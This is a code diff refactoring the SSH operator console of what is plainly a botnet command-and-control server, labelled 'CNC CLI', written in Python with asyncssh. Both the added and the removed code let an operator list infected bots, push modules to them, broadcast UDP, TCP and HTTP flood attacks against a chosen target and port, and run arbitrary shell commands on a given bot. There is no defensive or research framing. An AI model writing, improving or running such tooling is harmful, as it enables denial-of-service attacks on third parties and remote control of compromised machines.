@@ -25,7 +25,6 @@ async def start_ssh_server(
     db,
     cmd_queue,
 ):
-    """Khởi động asyncssh server tích hợp với asyncio loop."""
     try:
         import asyncssh
     except ImportError:
@@ -36,13 +35,138 @@ async def start_ssh_server(
 
     handler = CLICommandHandler(db, cmd_queue)
 
+    class _FlushWriter:
+        def __init__(self, writer):
+            self._w = writer
+
+        def write(self, data):
+            return self._w.write(data)
+
+        def flush(self):
+            pass
+
+    class _CNCSession(asyncssh.SSHServerSession):
+        def connection_made(self, chan):
+            self._chan = chan
+            self._console = None
+            self._buffer = ""
+
+        def pty_requested(self, term_type, term_size, term_modes):
+            return False
+
+        def shell_requested(self):
+            return True
+
+        def session_started(self):
+            flushable = _FlushWriter(self._chan)
+            self._console = Console(file=flushable, force_terminal=True, width=80)
+            self._console.print(
+                "[bold cyan]CNC CLI[/bold cyan] — type [bold]help[/bold] for commands, [bold]exit[/bold] to quit"
+            )
+            self._prompt()
+
+        def _prompt(self):
+            self._console.print("[cyan][CNC]>[/cyan] ", end="")
+
+        def data_received(self, data, datatype):
+            self._buffer += data
+            while "\n" in self._buffer:
+                line, self._buffer = self._buffer.split("\n", 1)
+                asyncio.ensure_future(self._dispatch(line.strip()))
+
+        def eof_received(self):
+            self._chan.close()
+
+        def connection_lost(self, exc):
+            self._console = None
+
+        async def _dispatch(self, line):
+            if not line:
+                self._prompt()
+                return
+
+            parts = line.split()
+            cmd_name = parts[0].lower()
+
+            if cmd_name in ("exit", "quit", "q"):
+                self._chan.close()
+                return
+
+            if cmd_name == "help":
+                _print_help(self._console)
+
+            elif cmd_name == "bots":
+                if len(parts) >= 2 and parts[1] == "count":
+                    resp = await handler.handle_action("bots_count", {})
+                    _print_bots_count(self._console, resp)
+                else:
+                    resp = await handler.handle_action("bots_list", {})
+                    _print_bots_list(self._console, resp)
+
+            elif cmd_name == "bot" and len(parts) >= 3 and parts[1] == "info":
+                resp = await handler.handle_action("bot_info", {"bot_id": parts[2]})
+                _print_bot_info(self._console, resp)
+
+            elif cmd_name == "cmd" and len(parts) >= 4 and parts[1] == "status":
+                resp = await handler.handle_action("cmd_status", {"cmd_id": parts[2]})
+                _print_cmd_status(self._console, resp)
+
+            elif cmd_name == "cmd" and len(parts) >= 4:
+                params = _parse_params(parts[3:])
+                resp = await handler.handle_action(
+                    "cmd_send",
+                    {"bot_id": parts[1], "module": parts[2], "params": params},
+                )
+                _print_cmd_send(self._console, resp)
+
+            elif cmd_name == "ping":
+                resp = await handler.handle_action("ping", {})
+                _print_ping(self._console, resp)
+
+            elif cmd_name in ("udp-attack", "tcp-attack", "http-attack"):
+                if len(parts) < 3:
+                    self._console.print(
+                        f"[yellow]Usage:[/yellow] {cmd_name} <target> <port> [threads=N] [duration=S] [size=B]"
+                    )
+                else:
+                    atk_type = cmd_name.split("-")[0]
+                    params = {"type": atk_type, "target": parts[1], "port": parts[2]}
+                    for extra in parts[3:]:
+                        if "=" in extra:
+                            k, v = extra.split("=", 1)
+                            params[k] = v
+                        else:
+                            params[f"arg{len(params)}"] = extra
+                    resp = await handler.handle_action(
+                        "cmd_broadcast", {"module": "flood", "params": params}
+                    )
+                    _print_broadcast(self._console, resp, "flood")
+
+            elif cmd_name == "shell" and len(parts) >= 3:
+                resp = await handler.handle_action(
+                    "cmd_send",
+                    {
+                        "bot_id": parts[1],
+                        "module": "shell",
+                        "params": {"cmd": " ".join(parts[2:])},
+                    },
+                )
+                _print_cmd_send(self._console, resp)
+
+            else:
+                self._console.print(
+                    f"[yellow]Unknown command:[/yellow] {cmd_name}. Type [bold]help[/bold] for available commands."
+                )
+
+            self._prompt()
+
     class _SSHServer(asyncssh.SSHServer):
         def connection_made(self, conn):
             self._conn = conn
 
         def connection_lost(self, exc):
             if exc:
-                logger.warning("SSH connection lost: %s", exc)
+                logger.debug("SSH connection closed: %s", exc)
 
         def begin_auth(self, username):
             return True
@@ -54,99 +178,7 @@ async def start_ssh_server(
             return pwd == password
 
         def session_requested(self):
-            return True
-
-    class _FlushWriter:
-        """Wrapper thêm no-op flush() cho SSH stdout để Rich Console hoạt động."""
-        def __init__(self, writer):
-            self._w = writer
-
-        def write(self, data):
-            return self._w.write(data)
-
-        def flush(self):
-            pass
-
-    async def _handle_session(stdin, stdout, stderr):
-        flushable = _FlushWriter(stdout)
-        console = Console(file=flushable, force_terminal=True, width=80)
-
-        console.print("[bold cyan]CNC CLI[/bold cyan] — type [bold]help[/bold] for commands, [bold]exit[/bold] to quit")
-
-        while True:
-            console.print("[cyan][CNC]>[/cyan] ", end="")
-            line = await stdin.readline()
-            if not line:
-                break
-            line = line.strip()
-            if not line:
-                continue
-
-            parts = line.split()
-            cmd_name = parts[0].lower()
-
-            if cmd_name in ("exit", "quit", "q"):
-                break
-
-            elif cmd_name == "help":
-                _print_help(console)
-
-            elif cmd_name == "bots":
-                if len(parts) >= 2 and parts[1] == "count":
-                    resp = await handler.handle_action("bots_count", {})
-                    _print_bots_count(console, resp)
-                else:
-                    resp = await handler.handle_action("bots_list", {})
-                    _print_bots_list(console, resp)
-
-            elif cmd_name == "bot" and len(parts) >= 3 and parts[1] == "info":
-                resp = await handler.handle_action("bot_info", {"bot_id": parts[2]})
-                _print_bot_info(console, resp)
-
-            elif cmd_name == "cmd" and len(parts) >= 4 and parts[1] == "status":
-                resp = await handler.handle_action("cmd_status", {"cmd_id": parts[2]})
-                _print_cmd_status(console, resp)
-
-            elif cmd_name == "cmd" and len(parts) >= 4:
-                params = _parse_params(parts[3:])
-                resp = await handler.handle_action(
-                    "cmd_send",
-                    {"bot_id": parts[1], "module": parts[2], "params": params},
-                )
-                _print_cmd_send(console, resp)
-
-            elif cmd_name == "ping":
-                resp = await handler.handle_action("ping", {})
-                _print_ping(console, resp)
-
-            elif cmd_name in ("udp-attack", "tcp-attack", "http-attack"):
-                if len(parts) < 3:
-                    console.print(f"[yellow]Usage:[/yellow] {cmd_name} <target> <port> [threads=N] [duration=S] [size=B]")
-                    continue
-                atk_type = cmd_name.split("-")[0]
-                params = {"type": atk_type, "target": parts[1], "port": parts[2]}
-                for extra in parts[3:]:
-                    if "=" in extra:
-                        k, v = extra.split("=", 1)
-                        params[k] = v
-                    else:
-                        params[f"arg{len(params)}"] = extra
-                resp = await handler.handle_action(
-                    "cmd_broadcast", {"module": "flood", "params": params}
-                )
-                _print_broadcast(console, resp, "flood")
-
-            elif cmd_name == "shell" and len(parts) >= 3:
-                resp = await handler.handle_action(
-                    "cmd_send",
-                    {"bot_id": parts[1], "module": "shell", "params": {"cmd": " ".join(parts[2:])}},
-                )
-                _print_cmd_send(console, resp)
-
-            else:
-                console.print(f"[yellow]Unknown command:[/yellow] {cmd_name}. Type [bold]help[/bold] for available commands.")
-
-        stdout.close()
+            return _CNCSession()
 
     try:
         server_key = asyncssh.generate_private_key("ssh-rsa")
@@ -155,9 +187,6 @@ async def start_ssh_server(
             port,
             server_host_keys=[server_key],
             server_factory=lambda: _SSHServer(),
-            session_factory=lambda stdin, stdout, stderr: _handle_session(
-                stdin, stdout, stderr
-            ),
             keepalive_interval=30,
             keepalive_count_max=5,
             tcp_keepalive=True,
